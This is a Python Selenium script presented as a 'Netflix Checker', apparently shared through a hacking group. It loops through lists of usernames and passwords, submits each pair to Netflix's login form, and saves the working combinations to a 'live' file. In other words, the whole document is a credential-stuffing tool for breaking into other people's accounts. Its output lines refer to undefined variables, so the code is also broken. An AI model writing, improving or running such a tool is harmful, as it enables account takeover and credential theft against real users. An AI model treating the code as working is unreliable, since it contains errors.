from selenium import webdriver
import time
live = open('NETFLIX-live.txt', 'w')
die = open('NETFLIX-die.txt', 'w')
print(""" 
 __   _   _____   _____   _____   _       _  __    __       _____   _   _   _____   _____   _   _    _____   _____   
|  \ | | | ____| |_   _| |  ___| | |     | | \ \  / /      /  ___| | | | | | ____| /  ___| | | / /  | ____| |  _  \  
|   \| | | |__     | |   | |__   | |     | |  \ \/ /       | |     | |_| | | |__   | |     | |/ /   | |__   | |_| |  
| |\   | |  __|    | |   |  __|  | |     | |   }  {        | |     |  _  | |  __|  | |     | |\ \   |  __|  |  _  /  
| | \  | | |___    | |   | |     | |___  | |  / /\ \       | |___  | | | | | |___  | |___  | | \ \  | |___  | | \ \  
|_|  \_| |_____|   |_|   |_|     |_____| |_| /_/  \_\      \_____| |_| |_| |_____| \_____| |_|  \_\ |_____| |_|  \_\ coded by : Dev01""")
print("""
		fb.com/groups/HK.GANG.18
		python v3.8""")

username = input("Upload list : ")
password = input("Password List : ")
username1 = open(username,"r").read().splitlines()
password1 = open(password,"r").read().splitlines()
for usr in username1:
	for pwd in password1:

            driver = webdriver.Chrome()
            driver.maximize_window()
            driver.get("https://www.netflix.com/sa-en/Login")
            checkemail = driver.find_element_by_xpath('//*[@id="id_userLoginId"]')
            checkemail.send_keys(usr)
            checkpass = driver.find_element_by_css_selector('#id_password')
            checkpass.send_keys(pwd)
            loginButton = driver.find_element_by_css_selector('#appMountPoint > div > div.login-body > div > div > div.hybrid-login-form-main > form > button')
            loginButton.click()

            if "profile-gate-label"  in driver.page_source:
                time.sleep(1)
                print("\033[32;1mLIVE\033[0m  | " + k + " : " + i + " | [(Checked)]")
                live.write(k + " : " + i + '\n')
            else:
                print("\033[31;1mDIE\033[0m | " + k + " : " + i + " | [(Checked)]")
                die.write(k + " : " + i + '\n')
            driver.close()

print("-" * 50)
print("\033[35;1mProccess Checking Done\033[0m")
print("Netflix Valid Email was Saved in NETFLIX-live.txt")